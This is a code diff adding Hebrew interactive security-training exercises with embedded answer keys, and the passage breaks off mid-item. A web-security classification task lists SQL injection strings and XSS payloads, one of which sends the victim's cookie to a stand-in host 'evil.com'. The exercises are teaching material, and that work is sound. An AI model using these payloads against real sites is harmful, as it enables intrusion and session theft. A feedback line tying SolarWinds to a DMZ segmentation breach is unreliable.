@@ -225,6 +225,73 @@ body{font-family:var(--sans);background:var(--bg);color:var(--text);min-height:1
   .header-xp{display:none}
   .tabs-bar{overflow-x:auto}
 }
+
+/* ===== INTERACTIVE LAB ===== */
+.lab-header{margin-bottom:18px}
+.lab-progress-row{display:flex;align-items:center;gap:10px}
+.lab-progress-label{font-family:var(--mono);font-size:11px;color:var(--accent);white-space:nowrap;font-weight:600}
+.lab-progress-bar{flex:1;height:5px;background:var(--surface2);border-radius:3px;border:1px solid var(--border)}
+.lab-progress-fill{height:100%;background:linear-gradient(90deg,var(--accent),var(--accent3));border-radius:3px;transition:width .4s ease}
+.lab-card{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:20px;margin-bottom:13px;box-shadow:0 1px 3px rgba(0,0,0,0.04);transition:border-color .2s}
+.lab-card.lab-card-done{border-color:rgba(21,128,61,0.35);background:rgba(21,128,61,0.02)}
+.lab-card-hdr{display:flex;justify-content:space-between;align-items:center;margin-bottom:10px}
+.lab-type-badge{font-family:var(--display);font-size:10px;font-weight:700;color:var(--accent);background:rgba(153,27,27,0.07);border:1px solid rgba(153,27,27,0.18);border-radius:20px;padding:2px 10px}
+.lab-card-num{font-family:var(--mono);font-size:10px;color:var(--text-muted)}
+.lab-card-q{font-size:14px;font-weight:600;color:var(--text);line-height:1.5;margin-bottom:14px;font-family:var(--display)}
+.lab-desc{font-size:12px;color:var(--text-muted);margin-bottom:12px;font-style:italic}
+.lab-explain-box{background:rgba(153,27,27,0.04);border:1px solid rgba(153,27,27,0.15);border-radius:6px;padding:11px 14px;margin-top:13px;font-size:12px;color:var(--text-dim);line-height:1.65}
+.lab-done-banner{background:rgba(21,128,61,0.07);border:1px solid rgba(21,128,61,0.25);border-radius:10px;padding:16px 20px;display:flex;align-items:center;gap:10px;font-family:var(--display);font-size:13px;font-weight:700;color:var(--green);margin-top:8px}
+
+/* fill */
+.fill-fields{display:flex;flex-direction:column;gap:8px}
+.fill-row{display:flex;align-items:center;gap:10px;padding:7px 10px;border-radius:6px;border:1px solid var(--border);background:var(--bg3);transition:border-color .15s,background .15s}
+.fill-row.fill-correct{border-color:var(--green);background:rgba(21,128,61,0.05)}
+.fill-row.fill-wrong{border-color:var(--red);background:rgba(185,28,28,0.04)}
+.fill-label{font-size:12px;color:var(--text-dim);min-width:140px;font-weight:500;flex-shrink:0}
+.fill-input-wrap{display:flex;align-items:center;gap:6px;flex:1}
+.fill-input{flex:1;border:none;background:transparent;font-family:var(--mono);font-size:12px;color:var(--text);outline:none}
+.fill-icon{font-weight:700;font-size:13px;color:var(--green);width:16px;text-align:center;flex-shrink:0}
+
+/* classify */
+.classify-pool{display:flex;flex-wrap:wrap;gap:7px;padding:12px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;margin-bottom:12px;min-height:44px}
+.classify-chip{padding:5px 11px;background:var(--surface);border:1px solid var(--border2);border-radius:20px;font-size:12px;color:var(--text-dim);cursor:pointer;transition:all .12s}
+.classify-chip:hover{border-color:var(--accent);color:var(--text);background:var(--accent-dim)}
+.classify-chip.selected{border-color:var(--accent3);background:rgba(220,38,38,0.08);color:var(--text);font-weight:600}
+.classify-cats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:8px}
+.classify-cat{border:2px dashed var(--border2);border-radius:8px;padding:10px;cursor:pointer;transition:border-color .15s;min-height:70px}
+.classify-cat:hover{border-color:var(--accent3);background:var(--accent-dim)}
+.classify-cat-title{font-family:var(--display);font-size:11px;font-weight:700;color:var(--accent);margin-bottom:7px}
+.classify-cat-zone{display:flex;flex-wrap:wrap;gap:5px;min-height:28px}
+.classify-drop-chip{display:inline-flex;align-items:center;padding:4px 9px;border-radius:15px;font-size:11px;font-weight:600;cursor:pointer;border:1px solid}
+.drop-correct{background:rgba(21,128,61,0.08);border-color:rgba(21,128,61,0.3);color:var(--green)}
+.drop-wrong{background:rgba(185,28,28,0.07);border-color:rgba(185,28,28,0.25);color:var(--red)}
+
+/* order */
+.order-pool{display:flex;flex-direction:column;gap:6px;margin-bottom:12px}
+.order-item{padding:9px 13px;background:var(--bg3);border:1px solid var(--border);border-radius:7px;font-size:13px;color:var(--text-dim);cursor:pointer;text-align:right;transition:all .12s}
+.order-item:hover:not(:disabled){border-color:var(--border2);color:var(--text);background:var(--accent-dim)}
+.order-item.order-selected{opacity:.35;cursor:not-allowed}
+.order-sequence{background:var(--bg3);border:1px solid var(--border);border-radius:7px;padding:10px;min-height:44px;margin-bottom:4px}
+.order-seq-label{font-family:var(--display);font-size:10px;color:var(--text-muted);margin-bottom:7px;text-transform:uppercase;letter-spacing:1px;font-weight:600}
+.order-seq-zone{display:flex;flex-direction:column;gap:5px}
+.order-seq-step{display:flex;align-items:center;gap:8px;padding:6px 10px;background:var(--surface);border:1px solid var(--border2);border-radius:6px;font-size:12px;color:var(--text-dim);cursor:pointer;transition:background .1s}
+.order-seq-step:hover{background:rgba(185,28,28,0.04)}
+.order-seq-num{font-family:var(--mono);font-size:10px;font-weight:700;width:18px;height:18px;border-radius:50%;background:var(--accent);color:#fff;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.order-feedback{font-size:13px;font-weight:600;font-family:var(--display);margin-top:6px;min-height:20px}
+.order-feedback.ok{color:var(--green)}.order-feedback.err{color:var(--red)}.order-feedback.warn{color:var(--orange)}
+
+/* mchoice */
+.mch-opts{display:flex;flex-direction:column;gap:7px}
+.mch-opt{display:flex;align-items:flex-start;gap:10px;padding:10px 13px;background:var(--bg3);border:1px solid var(--border);border-radius:8px;cursor:pointer;transition:all .12s;text-align:right;width:100%}
+.mch-opt:hover:not(:disabled){border-color:var(--border2);background:var(--accent-dim)}
+.mch-opt.mch-correct{border-color:var(--green);background:rgba(21,128,61,0.06)}
+.mch-opt.mch-wrong{border-color:var(--red);background:rgba(185,28,28,0.05)}
+.mch-letter{font-family:var(--mono);font-size:10px;font-weight:700;width:22px;height:22px;border-radius:4px;display:flex;align-items:center;justify-content:center;background:var(--surface2);color:var(--text-muted);flex-shrink:0}
+.mch-correct .mch-letter{background:var(--green);color:#fff}
+.mch-wrong .mch-letter{background:var(--red);color:#fff}
+.mch-text{font-size:13px;color:var(--text-dim);line-height:1.4;flex:1}
+.mch-feedback{font-size:12px;color:var(--text-dim);line-height:1.6;padding:8px 12px;background:rgba(153,27,27,0.03);border-right:3px solid rgba(153,27,27,0.2);margin:0 0 4px;border-radius:3px;animation:fadeUp .15s ease}
+
 </style>
 </head>
 <body>
@@ -1214,6 +1281,868 @@ last && lastb                 <span class="comment"># login history + failures</
 </div>`
   ]
 }};
+// Interactive lab exercises — per chapter
+// Each exercise: {q, type, check, hints, explain, [options/template/expected]}
+// Types: 'fill' (fill in blank), 'classify' (drag/click to classify), 'order' (sequence), 'mchoice' (scenario → pick best action)
+
+const ILABS = {
+0:[ // מבוא
+  {
+    type:'classify',
+    q:'סווגי כל תרחיש לפי עמודת CIA שנפגעת',
+    desc:'גרור או לחץ על כל תרחיש ואחר כך על הקטגוריה המתאימה',
+    items:[
+      {id:'a', text:'האקר מצפין קבצי ה-DB של הארגון בransomware', ans:'A'},
+      {id:'b', text:'מישהו קרא מיילים פרטיים של עובד', ans:'C'},
+      {id:'c', text:'תוקף שינה את הסכום בהוראת תשלום מ-1,000₪ ל-100,000₪', ans:'I'},
+      {id:'d', text:'DDoS הוריד את אתר החברה ל-4 שעות', ans:'A'},
+      {id:'e', text:'מפתח גנב קוד קנייני ומכר לצד שלישי', ans:'C'},
+      {id:'f', text:'תוקפת שינתה תוצאות בדיקות בבית חולים', ans:'I'},
+    ],
+    categories:['C — Confidentiality','I — Integrity','A — Availability'],
+    catKeys:['C','I','A'],
+    explain:'C = מי רואה. I = מה כתוב. A = האם זמין. הרבה תרחישים פוגעים ביותר מאחד.'
+  },
+  {
+    type:'order',
+    q:'סדרי את שלבי Defense in Depth מהחיצוני לפנימי',
+    desc:'לחצי על הכרטיסיות בסדר הנכון — מהשכבה הכי חיצונית לכי פנימית',
+    items:[
+      {id:'e', text:'🔐 Data Encryption'},
+      {id:'b', text:'🌐 Perimeter Firewall'},
+      {id:'d', text:'🖥️ Endpoint Security (AV/EDR)'},
+      {id:'c', text:'🔗 Network Segmentation'},
+      {id:'a', text:'👤 Identity & MFA'},
+    ],
+    correct:['b','c','d','e','a'],
+    explain:'Perimeter (firewall) → Network (segmentation) → Endpoint (AV) → Data (encryption) → Identity (MFA). כל שכבה מעצבת את הבאה.'
+  },
+  {
+    type:'mchoice',
+    q:'תרחיש: עובד קיבל מייל "מה-CEO" שמבקש לאפס מיידית את סיסמתו דרך קישור. מה הצעד הנכון ביותר?',
+    options:[
+      {text:'לאפס את הסיסמה דרך הקישור כי מגיע מה-CEO', correct:false, feedback:'❌ זו התקפת phishing קלאסית. קישורים במיילים דחופים = חשד מיידי.'},
+      {text:'להתקשר ל-CEO ישירות במספר הידוע כדי לאמת', correct:true, feedback:'✅ נכון! לעולם לא מאמתים כמות בתגובה למייל — מאמתים מחוץ לערוץ (out-of-band).'},
+      {text:'להעביר את המייל ל-IT ולחכות', correct:false, feedback:'⚠️ טוב יותר מהראשון, אבל לא אידיאלי — אם זה phishing ממוקד, ה-IT צריך לדעת מיידית ואתה צריך לאמת.'},
+      {text:'למחוק את המייל ולא לעשות כלום', correct:false, feedback:'❌ לא מספיק. צריך לדווח ל-security team — ייתכן שאחרים קיבלו את אותו מייל.'},
+    ],
+    explain:'Social engineering מסתמך על דחיפות ועל אוטוריטה. Out-of-band verification = פתרון לכל מייל דחוף.'
+  },
+  {
+    type:'fill',
+    q:'השלימי: מודל STRIDE — כל אות מייצגת איום.',
+    fields:[
+      {label:'S', placeholder:'מה S מייצג?', answer:'spoofing', alt:['spoofing','התחזות']},
+      {label:'T', placeholder:'מה T מייצג?', answer:'tampering', alt:['tampering','שינוי','שינוי נתונים']},
+      {label:'R', placeholder:'מה R מייצג?', answer:'repudiation', alt:['repudiation','הכחשה','הכחשת פעולה']},
+      {label:'I', placeholder:'מה I מייצג?', answer:'information disclosure', alt:['information disclosure','חשיפת מידע','info disclosure']},
+      {label:'D', placeholder:'מה D מייצג?', answer:'denial of service', alt:['denial of service','dos','d.o.s','הפסקת שירות']},
+      {label:'E', placeholder:'מה E מייצג?', answer:'elevation of privilege', alt:['elevation of privilege','הסלמת הרשאות','elevation']},
+    ],
+    explain:'S=Spoofing, T=Tampering, R=Repudiation, I=Information Disclosure, D=Denial of Service, E=Elevation of Privilege.'
+  },
+],
+1:[ // קריפטוגרפיה
+  {
+    type:'classify',
+    q:'סווגי כל אלגוריתם לקטגוריה הנכונה',
+    desc:'לחצי על כל אלגוריתם ואחר כך על הקטגוריה',
+    items:[
+      {id:'a', text:'AES-256', ans:'SYM'},
+      {id:'b', text:'RSA-2048', ans:'ASYM'},
+      {id:'c', text:'SHA-256', ans:'HASH'},
+      {id:'d', text:'bcrypt', ans:'HASH'},
+      {id:'e', text:'Ed25519', ans:'ASYM'},
+      {id:'f', text:'ChaCha20', ans:'SYM'},
+      {id:'g', text:'MD5', ans:'HASH'},
+      {id:'h', text:'ECDSA', ans:'ASYM'},
+    ],
+    categories:['🔑 Symmetric','🗝️ Asymmetric','#️⃣ Hash'],
+    catKeys:['SYM','ASYM','HASH'],
+    explain:'Symmetric = מפתח אחד לשני הכיוונים. Asymmetric = זוג public/private. Hash = חד-כיווני, ללא מפתח.'
+  },
+  {
+    type:'mchoice',
+    q:'אפליקציה שומרת סיסמאות משתמשים ב-DB. מה הנכון ביותר?',
+    options:[
+      {text:'AES-256 הצפנה על הסיסמה', correct:false, feedback:'❌ הצפנה ניתנת לפענוח — אם DB נפרץ ו-key נחשף, כל הסיסמאות חשופות. לא מתאים.'},
+      {text:'SHA-256 hash של הסיסמה', correct:false, feedback:'❌ SHA-256 מהיר מדי — GPU מנסה מיליארדים בשנייה. rainbow tables. לא מתאים לסיסמאות.'},
+      {text:'bcrypt עם work factor 12', correct:true, feedback:'✅ bcrypt מוגדר להיות איטי. work factor 12 = ~250ms לחישוב — בלתי מעשי לbrute force.'},
+      {text:'לאחסן plaintext אבל בDB מוצפן', correct:false, feedback:'❌ הצפנת DB לא מגנה מDB admin, מSQL injection שמחזיר plaintext, או מdata breach.'},
+    ],
+    explain:'סיסמאות = bcrypt, scrypt, או Argon2. לעולם לא SHA-*/MD5 (מהירים מדי) ולא AES (ניתן לפענוח).'
+  },
+  {
+    type:'order',
+    q:'סדרי את שלבי TLS Handshake בסדר הנכון',
+    desc:'לחצי בסדר ביצוע של TLS 1.3',
+    items:[
+      {id:'c', text:'🔐 Both sides derive session keys'},
+      {id:'a', text:'👋 Client Hello (supported ciphers)'},
+      {id:'d', text:'🔒 Encrypted communication (AES)'},
+      {id:'b', text:'📜 Server sends Certificate'},
+    ],
+    correct:['a','b','c','d'],
+    explain:'TLS: Client Hello → Server Certificate → Key Derivation → Encrypted Data. Asymmetric בהתחלה, Symmetric לנתונים.'
+  },
+  {
+    type:'fill',
+    q:'השלימי: באיזה hash algorithm להשתמש בכל מקרה?',
+    fields:[
+      {label:'סיסמאות משתמשים', placeholder:'שם האלגוריתם', answer:'bcrypt', alt:['bcrypt','argon2','scrypt']},
+      {label:'אימות קובץ שהורד', placeholder:'שם האלגוריתם', answer:'sha-256', alt:['sha-256','sha256','sha-3','sha3']},
+      {label:'חתימה דיגיטלית על קוד', placeholder:'שם האלגוריתם', answer:'sha-256', alt:['sha-256','sha256','sha-384','sha-512']},
+      {label:'Hash שאסור להשתמש בו לאבטחה', placeholder:'שם האלגוריתם', answer:'md5', alt:['md5','sha-1','sha1']},
+    ],
+    explain:'bcrypt/Argon2 = סיסמאות (מכוון להיות איטי). SHA-256+ = integrity, signing. MD5/SHA-1 = שבורים, collision attacks.'
+  },
+],
+2:[ // אבטחת רשתות
+  {
+    type:'classify',
+    q:'סווגי כל כלי/טכנולוגיה לקטגוריה הנכונה',
+    items:[
+      {id:'a', text:'Snort', ans:'IDS'},
+      {id:'b', text:'iptables', ans:'FW'},
+      {id:'c', text:'Suricata', ans:'IDS'},
+      {id:'d', text:'Palo Alto NGFW', ans:'FW'},
+      {id:'e', text:'Wireguard', ans:'VPN'},
+      {id:'f', text:'Cloudflare WAF', ans:'FW'},
+      {id:'g', text:'OpenVPN', ans:'VPN'},
+      {id:'h', text:'Zeek (Bro)', ans:'IDS'},
+    ],
+    categories:['🔥 Firewall/WAF','🕵️ IDS/IPS','🔒 VPN'],
+    catKeys:['FW','IDS','VPN'],
+    explain:'Firewall = גישה/חסימה. IDS/IPS = ניתוח תנועה וזיהוי חריגות. VPN = הצפנת ערוץ גישה מרחוק.'
+  },
+  {
+    type:'order',
+    q:'בארגון שמיישם Zero Trust — סדרי את בדיקות הגישה מהראשונה לאחרונה',
+    items:[
+      {id:'d', text:'📊 Monitor session continuously'},
+      {id:'b', text:'📱 Verify device health (MDM check)'},
+      {id:'a', text:'🪪 Verify identity (MFA)'},
+      {id:'c', text:'🔐 Apply least privilege access'},
+    ],
+    correct:['a','b','c','d'],
+    explain:'Identity first → Device health → Least privilege → Continuous monitoring. Zero Trust לא נגמר בlogin — המעקב הוא רציף.'
+  },
+  {
+    type:'mchoice',
+    q:'תרחיש: תוקף פרץ ל-web server בDMZ. אילו מערכות בסיכון הגדול ביותר?',
+    options:[
+      {text:'שום דבר — DMZ מבודדת', correct:false, feedback:'❌ DMZ מבודדת מהinternet אבל לא בהכרח מה-internal network אם אין segmentation נכון.'},
+      {text:'ה-DB server ב-internal network אם יש חור ב-segmentation', correct:true, feedback:'✅ נכון. SolarWinds הדגים זאת — breach ב-DMZ הגיע ל-internal systems דרך חורים בsegmentation.'},
+      {text:'רק שרתים אחרים ב-DMZ', correct:false, feedback:'⚠️ חלקית נכון — שרתים ב-DMZ בסיכון, אבל עם חורים ב-segmentation ה-DB הפנימי בסיכון גדול יותר.'},
+      {text:'הinternet בלבד', correct:false, feedback:'❌ הפוך — ה-web server עצמו זה מה שבין לinternet. השאלה היא מה ה-tוקף יכול להגיע ממנו לפנים.'},
+    ],
+    explain:'DMZ = buffer zone. אם firewall בין DMZ ל-internal network לא מוגדר נכון — ה-DB פנימה בסיכון. Segmentation ו-Zero Trust מונעים lateral movement.'
+  },
+  {
+    type:'fill',
+    q:'השלימי: firewall rules לפי עקרון "deny by default"',
+    fields:[
+      {label:'כלל 1: HTTP מכל מקום לport 80', placeholder:'ALLOW / DENY', answer:'allow', alt:['allow','permit','accept']},
+      {label:'כלל 2: SSH מ-IP חיצוני לא מוכר', placeholder:'ALLOW / DENY', answer:'deny', alt:['deny','drop','block','reject']},
+      {label:'כלל 3: כל שאר התנועה (default rule)', placeholder:'ALLOW / DENY', answer:'deny', alt:['deny','drop','block','reject']},
+      {label:'כלל 4: חיבורים שכבר נוצרו (ESTABLISHED)', placeholder:'ALLOW / DENY', answer:'allow', alt:['allow','permit','accept']},
+    ],
+    explain:'Deny by default = חסום הכל, אפשר מה שצריך במפורש. ESTABLISHED = stateful — מאפשר traffic חזרה של חיבורים לגיטימיים.'
+  },
+],
+3:[ // Web Security
+  {
+    type:'classify',
+    q:'סווגי כל payload לסוג ההתקפה',
+    items:[
+      {id:'a', text:"&#x27; OR &#x27;1&#x27;=&#x27;1", ans:'SQLi'},
+      {id:'b', text:'&lt;script&gt;alert(document.cookie)&lt;/script&gt;', ans:'XSS'},
+      {id:'c', text:"&#x27;; DROP TABLE users; --", ans:'SQLi'},
+      {id:'d', text:'&lt;img onerror=fetch(&quot;evil.com&quot;+cookie)&gt;', ans:'XSS'},
+      {id:'e', text:"1 UNION SELECT username,password FROM users--", ans:'SQLi'},
+      {id:'f', text:'javascript&#58;alert(1)', ans:'XSS'},
+    ],
+    categories:["💉 SQL Injection","🔀 XSS"],
+    catKeys:['SQLi','XSS'],
+    explain:"SQLi = מניפולציה על SQL query. XSS = הרצת JavaScript זדוני בbrowser קורבן. שניהם = input validation כשל."
+  },
+  {
+    type:'mchoice',
+    q:'מפתחת כתבה: `query = "SELECT * FROM products WHERE id=" + request.params.id`. מה הסיכון ומה הפתרון?',
+    options:[
+      {text:'סיכון: ביצועים. פתרון: caching', correct:false, feedback:'❌ לא סיכון ביצועים — זה SQL Injection. תוקף יכול לשלוח ?id=1 OR 1=1 ולקבל כל ה-DB.'},
+      {text:'סיכון: SQL Injection. פתרון: להוסיף HTTPS', correct:false, feedback:'❌ HTTPS מצפין את הerוץ אבל לא מגן מSQL Injection. הבעיה היא בקוד עצמו.'},
+      {text:'סיכון: SQL Injection. פתרון: parameterized query', correct:true, feedback:'✅ נכון. query = db.prepare("SELECT * FROM products WHERE id=?").get(id). Input הופך לdata, לא לקוד SQL.'},
+      {text:'סיכון: XSS. פתרון: encode output', correct:false, feedback:'❌ הבעיה היא SQL Injection, לא XSS. Output encoding חשוב אבל לא פותר את הסיכון הזה.'},
+    ],
+    explain:'Parameterized queries = הפתרון היחיד האמיתי לSQLi. ORM כמו Sequelize/SQLAlchemy עושים זאת אוטומטית.'
+  },
+  {
+    type:'order',
+    q:'כיצד מתבצעת Stored XSS attack? סדרי את השלבים',
+    items:[
+      {id:'c', text:'🌐 Victim visits the page — script executes in their browser'},
+      {id:'a', text:'😈 Attacker posts comment with &lt;script&gt; tag'},
+      {id:'d', text:'🍪 Script steals victim\'s session cookie'},
+      {id:'b', text:'💾 Server saves malicious comment to database'},
+    ],
+    correct:['a','b','c','d'],
+    explain:'Stored XSS: פרסום → שמירה בDB → הרצה על כל visitor → גנבת session. לכן "Stored" = מסוכן יותר מReflected.'
+  },
+  {
+    type:'fill',
+    q:'השלימי: headers נכונים להגנת web app',
+    fields:[
+      {label:'מונע XSS — מגדיר מקורות מורשים לscripts', placeholder:'שם ה-header', answer:'content-security-policy', alt:['content-security-policy','csp','content security policy']},
+      {label:'מגן מclickjacking — מונע iframe', placeholder:'שם ה-header', answer:'x-frame-options', alt:['x-frame-options','x frame options']},
+      {label:'Cookie שJS לא יכול לגשת', placeholder:'שם ה-flag', answer:'httponly', alt:['httponly','http-only','http only']},
+      {label:'Cookie שנשלח רק ב-HTTPS', placeholder:'שם ה-flag', answer:'secure', alt:['secure']},
+    ],
+    explain:'CSP = הגנה מXSS. X-Frame-Options = clickjacking. HttpOnly = cookies בטוחים מXSS. Secure = HTTPS only.'
+  },
+],
+4:[ // Auth & IAM
+  {
+    type:'classify',
+    q:'סווגי כל authentication method לפי "factor type"',
+    items:[
+      {id:'a', text:'סיסמה', ans:'KNOW'},
+      {id:'b', text:'YubiKey', ans:'HAVE'},
+      {id:'c', text:'טביעת אצבע', ans:'ARE'},
+      {id:'d', text:'TOTP app (Google Authenticator)', ans:'HAVE'},
+      {id:'e', text:'PIN', ans:'KNOW'},
+      {id:'f', text:'סריקת רשתית', ans:'ARE'},
+      {id:'g', text:'SMS OTP', ans:'HAVE'},
+      {id:'h', text:'Security question', ans:'KNOW'},
+    ],
+    categories:['🧠 Something you Know','📱 Something you Have','👤 Something you Are'],
+    catKeys:['KNOW','HAVE','ARE'],
+    explain:'MFA = שני factors שונים מ-3 הסוגים. "Know+Have" = MFA טוב. "Know+Know" (2 סיסמאות) = לא MFA אמיתי.'
+  },
+  {
+    type:'mchoice',
+    q:'JWT token שנוצר עם alg:HS256 נשמר ב-localStorage. מהי הפגיעות הקריטית ביותר?',
+    options:[
+      {text:'JWT גדול מדי לheader', correct:false, feedback:'❌ גודל הוא אתגר ביצועים, לא אבטחה קריטית.'},
+      {text:'localStorage חשוף ל-XSS — JS יכול לגנוב את הtoken', correct:true, feedback:'✅ נכון. כל XSS vulnerability בכל מקום באפליקציה מאפשר: localStorage.getItem("token"). HttpOnly Cookie = הפתרון.'},
+      {text:'HS256 חלש מ-RS256', correct:false, feedback:'⚠️ HS256 בסדר אם הsecret חזק, אבל זה לא הפגיעות הקריטית ביותר בתרחיש הזה.'},
+      {text:'JWT לא מוצפן', correct:false, feedback:'⚠️ נכון שJWT payload קריא (base64), אבל זה ידוע ומקובל. הבעיה הקריטית היא localStorage+XSS.'},
+    ],
+    explain:'HttpOnly Cookie = JavaScript לא יכול לקרוא. Secure+SameSite=Strict = הגנה מלאה. localStorage = XSS-vulnerable תמיד.'
+  },
+  {
+    type:'order',
+    q:'OAuth 2.0 Authorization Code Flow — סדרי את השלבים',
+    items:[
+      {id:'d', text:'🎫 App exchanges code for access token'},
+      {id:'b', text:'✅ User approves permissions on Google'},
+      {id:'a', text:'🔀 User clicks "Login with Google" — redirected to Google'},
+      {id:'e', text:'🔓 App uses token to call APIs on user\'s behalf'},
+      {id:'c', text:'↩️ Google redirects back with authorization code'},
+    ],
+    correct:['a','b','c','d','e'],
+    explain:'Authorization Code Flow: redirect → user consent → code → token exchange → API access. המשתמש לא נחשף לapp credentials.'
+  },
+  {
+    type:'fill',
+    q:'השלימי: איזה MFA כדאי לכל role?',
+    fields:[
+      {label:'עובד רגיל — login יומי', placeholder:'TOTP / SMS / Hardware Key', answer:'totp', alt:['totp','authenticator','google authenticator','totp app','app']},
+      {label:'Admin / DevOps — גישה לprod', placeholder:'TOTP / SMS / Hardware Key', answer:'hardware key', alt:['hardware key','yubikey','fido2','hardware','fido','passkey']},
+      {label:'MFA חלש מכי שניתן לSIM swap', placeholder:'שם השיטה', answer:'sms', alt:['sms','sms otp','sms code']},
+      {label:'עתיד MFA — biometric+device', placeholder:'שם הטכנולוגיה', answer:'passkey', alt:['passkey','passkeys','fido2','webauthn']},
+    ],
+    explain:'SMS = חלש (SIM swap). TOTP = טוב לרוב. Hardware Key = הכי חזק לadmins. Passkeys = עתיד בלי סיסמאות.'
+  },
+],
+5:[ // Malware & Social Eng
+  {
+    type:'classify',
+    q:'סווגי כל תרחיש לסוג ההתקפה',
+    items:[
+      {id:'a', text:'"הבנק שלך מבקש לאמת פרטים" — מייל המוני', ans:'PHISH'},
+      {id:'b', text:'"שלום נועה, ראיתי שאת VP Engineering ב-Acme..." — מייל ממוקד', ans:'SPEAR'},
+      {id:'c', text:'שיחה טלפונית: "אני מה-IT, צריך סיסמתך לתמיכה"', ans:'VISH'},
+      {id:'d', text:'"שלום CEO, צריכה העברת $200K דחופה" — מייל לCFO', ans:'WHALE'},
+      {id:'e', text:'USB נמצא בחניה — מחובר למחשב → malware', ans:'PHYS'},
+      {id:'f', text:'SMS: "חשבונך ננעל, לחצי כאן"', ans:'SMISH'},
+    ],
+    categories:['🎣 Phishing','🎯 Spear Phishing','🐳 Whaling','📞 Vishing','📱 Smishing','🔌 Physical'],
+    catKeys:['PHISH','SPEAR','WHALE','VISH','SMISH','PHYS'],
+    explain:'Phishing = המוני. Spear = ממוקד. Whaling = C-level. Vishing = קול. Smishing = SMS. Physical = USB/tailgating.'
+  },
+  {
+    type:'order',
+    q:'Ransomware attack kill chain — סדרי בסדר הנכון',
+    items:[
+      {id:'e', text:'💰 Ransom demand displayed'},
+      {id:'b', text:'🦠 Malware payload executes'},
+      {id:'d', text:'🔒 Files encrypted with AES'},
+      {id:'c', text:'🕵️ Lateral movement — spreads across network'},
+      {id:'a', text:'📧 Phishing email opened — initial access'},
+    ],
+    correct:['a','b','c','d','e'],
+    explain:'Phishing → Execute → Lateral Movement → Encrypt → Ransom. שים לב: הצפנה מגיעה בסוף — לאחר שהתוקף כבר בכל הרשת.'
+  },
+  {
+    type:'mchoice',
+    q:'עובד מצאה USB מחוץ למשרד עם מדבקה "SALARY_2024_CONFIDENTIAL.xlsx". מה עליה לעשות?',
+    options:[
+      {text:'לחבר למחשב כדי לגלות למי שייך ולהחזיר', correct:false, feedback:'❌ USB Drop attack קלאסי! מדבקה מפתה = סוציאל אנג׳ינירינג. USB יכול להכיל AutoRun malware, HID attack, או rubber ducky.'},
+      {text:'לחבר למחשב בודד שאינו מחובר לרשת', correct:false, feedback:'❌ גם "air-gapped" machine יכולה להיפרץ. הUSB יכול לחקות מקלדת (HID) ולהריץ פקודות.'},
+      {text:'למסור לצוות IT/Security ולא לחבר', correct:true, feedback:'✅ נכון! IT יש כלים לבדוק USB בסביבה בטוחה. עובדים לא אמורים לחבר USB לא ידוע בשום מקרה.'},
+      {text:'לזרוק — בטוח שהכי טוב', correct:false, feedback:'⚠️ טוב יותר מלחבר, אבל לא אידיאלי. Security team צריכה לדעת — זה אירוע אבטחה שצריך תיעוד.'},
+    ],
+    explain:'USB Drop = social engineering פיזי. Rubber Ducky emulates keyboard. כל USB לא מוכר = פוטנציאל malware vector.'
+  },
+  {
+    type:'fill',
+    q:'השלימי: מה מגן מכל איום?',
+    fields:[
+      {label:'מה מונע WannaCry-style ransomware?', placeholder:'תגובה קצרה', answer:'patch management', alt:['patch management','patches','patching','עדכוני אבטחה','windows update']},
+      {label:'מה מגן מDouble Extortion (מעבר לbackup)?', placeholder:'תגובה קצרה', answer:'dlp', alt:['dlp','data loss prevention','network monitoring','segmentation','פילוח רשת']},
+      {label:'מה הכי מגן מspear phishing?', placeholder:'תגובה קצרה', answer:'security awareness', alt:['security awareness','training','awareness training','הדרכה','mfa']},
+      {label:'אחוז התקיפות שמתחילות בphishing', placeholder:'אחוז', answer:'91', alt:['91','91%','~91','כ-91']},
+    ],
+    explain:'Patch management = #1 נגד known vulnerabilities. Security awareness = #1 נגד social engineering. DLP = מגן מדליפת נתונים גם אם נפרץ.'
+  },
+],
+6:[ // IR
+  {
+    type:'order',
+    q:'NIST Incident Response — סדרי את השלבים בסדר הנכון',
+    items:[
+      {id:'c', text:'🔒 Containment — בידוד מערכות נגועות'},
+      {id:'e', text:'🔄 Recovery — חזרה לפעילות מבוקרת'},
+      {id:'a', text:'📋 Preparation — מדיניות ותכנון מוקדם'},
+      {id:'d', text:'🧹 Eradication — ניקוי מלא של malware'},
+      {id:'f', text:'📝 Post-Incident — לקחים והמלצות'},
+      {id:'b', text:'🚨 Detection & Analysis — זיהוי ואימות האירוע'},
+    ],
+    correct:['a','b','c','d','e','f'],
+    explain:'NIST IR: Preparation → Detection → Containment → Eradication → Recovery → Lessons Learned. לא מדלגים שלבים!'
+  },
+  {
+    type:'order',
+    q:'Order of Volatility — סדרי מהנדיף ביותר לעמיד ביותר',
+    items:[
+      {id:'d', text:'💿 Disk / File System'},
+      {id:'b', text:'🌐 Active Network Connections'},
+      {id:'c', text:'🧠 RAM Memory'},
+      {id:'a', text:'⚡ CPU Registers & Cache'},
+    ],
+    correct:['a','b','c','d'],
+    explain:'CPU registers → Network → RAM → Disk. Reboot מאבד את CPU+Network+RAM לגמרי. תמיד שמרי volatile data קודם לפני כל פעולה.'
+  },
+  {
+    type:'mchoice',
+    q:'גילית שמחשב עובד מדביק malware ל-network shares. מה הפעולה הראשונה?',
+    options:[
+      {text:'לכבות את המחשב מיידית כדי לעצור את ה-malware', correct:false, feedback:'❌ כיבוי = אובדן RAM (פרוצסים פעילים, network connections, keys). תחילה לבדד, לא לכבות.'},
+      {text:'להריץ antivirus scan כדי לנקות', correct:false, feedback:'❌ לא בשלב הזה — תחילה containment. AV scan עלול לשנות timestamps ולפגוע בforensic evidence.'},
+      {text:'לנתק מהרשת (unplug) ולהסגיר — לא לכבות', correct:true, feedback:'✅ Containment ראשון: נתקי מהרשת כדי לעצור lateral movement. לא כיבוי — RAM יכיל malware artifacts.'},
+      {text:'להמשיך לעבוד ולצלם screenshots כראיה', correct:false, feedback:'❌ כל רגע שהmachines מחוברת = malware ממשיך להתפשט. Containment קודם, screenshots אחר כך.'},
+    ],
+    explain:'IR: Containment = FIRST. Network isolation (לא shutdown) שומר על RAM לforensics ועוצר lateral movement.'
+  },
+  {
+    type:'classify',
+    q:'סווגי כל פריט ל-IOC (Indicator of Compromise) או TTP (Tactic/Technique/Procedure)',
+    items:[
+      {id:'a', text:'MD5: a1b2c3d4e5f6...', ans:'IOC'},
